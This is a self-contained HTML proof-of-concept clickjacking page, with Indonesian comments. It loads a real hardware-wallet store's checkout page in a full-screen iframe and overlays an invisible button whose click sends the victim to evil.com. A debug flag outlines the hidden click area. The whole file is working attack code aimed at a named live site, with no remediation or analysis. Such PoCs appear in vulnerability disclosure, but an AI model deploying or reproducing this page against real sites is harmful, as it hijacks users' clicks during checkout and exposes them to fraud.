<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
  <title>Clickjacking PoC</title>
  <style>
    html, body {
      margin: 0;
      height: 100%;
      overflow: hidden;
      background: #000;
    }
    /* Halaman target */
    #victim {
      position: absolute;
      inset: 0;
      width: 100%;
      height: 100%;
      border: 0;
      z-index: 1;
      opacity: 1;          /* jelas terlihat */
      pointer-events: auto;
    }
    /* Tombol transparan */
    #trap {
      position: absolute;
      z-index: 2;
      background: transparent;
      border: none;
      padding: 0;
      margin: 0;
      opacity: 0;          /* full transparan */
      cursor: pointer;
    }
    /* Optional: outline saat debug */
    #outline {
      position: absolute;
      z-index: 3;
      border: 2px dashed rgba(255,255,255,.25);
      display: none;
    }
  </style>
</head>
<body>

  <!-- Ganti cart_id sesuai target -->
  <iframe id="victim" src="https://store.tangem.com/checkout?cart_id="></iframe>

  <button id="trap" aria-label="transparent click area"></button>
  <div id="outline"></div>

  <script>
    const qs = new URLSearchParams(location.search);

    // URL target
    const frame = document.getElementById('victim');
    const cid = qs.get('cart_id') || '';
    if (cid) frame.src = `https://store.tangem.com/checkout?cart_id=${encodeURIComponent(cid)}`;

    // Posisi default tombol overlay (bawah layar)
    const trap = document.getElementById('trap');
    const outline = document.getElementById('outline');
    const debug = qs.get('debug') === '1';

    function setTrap() {
      trap.style.width = '88vw';
      trap.style.height = '56px';
      trap.style.left = '50%';
      trap.style.transform = 'translateX(-50%)';
      trap.style.bottom = '90px'; // jarak dari bawah
      trap.style.position = 'absolute';

      if (debug) {
        outline.style.display = 'block';
        const rect = trap.getBoundingClientRect();
        outline.style.left = rect.left + 'px';
        outline.style.top = rect.top + 'px';
        outline.style.width = rect.width + 'px';
        outline.style.height = rect.height + 'px';
      }
    }
    setTrap();

    // Klik -> redirect ke evil.com
    trap.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = 'https://evil.com';
    });
  </script>
</body>
</html>
